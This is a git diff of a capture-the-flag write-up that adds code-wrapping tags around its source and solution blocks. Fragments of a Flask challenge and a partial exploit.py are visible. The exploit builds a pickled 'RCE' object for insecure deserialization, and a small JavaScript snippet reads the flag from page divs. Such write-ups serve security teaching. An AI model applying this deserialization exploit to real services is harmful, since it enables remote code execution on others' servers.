@@ -28,6 +28,7 @@ layout:
 
 ## Source
 
+{% code overflow="wrap" %}
 ```py
 import base64
 import pickle
@@ -67,11 +68,13 @@ def add():
 
 app.run(threaded=True, host="0.0.0.0")
 ```
+{% endcode %}
 
 ## Solution
 
 #### exploit.py
 
+{% code overflow="wrap" %}
 ```py
 import pickle
 import base64
@@ -87,9 +90,11 @@ if __name__ == '__main__':
     pickled = pickle.dumps(RCE())
     print(base64.urlsafe_b64encode(pickled))
 ```
+{% endcode %}
 
 #### print_flag.js
 
+{% code overflow="wrap" %}
 ```js
 var divs = document.getElementsByTagName("div");
 var flag = "";
@@ -100,5 +105,6 @@ for (var i = 0; i < divs.length; i++) {
 
 console.log(flag);
 ```
+{% endcode %}
 
 Flag: `actf{you_got_yourself_out_of_a_pickle}`
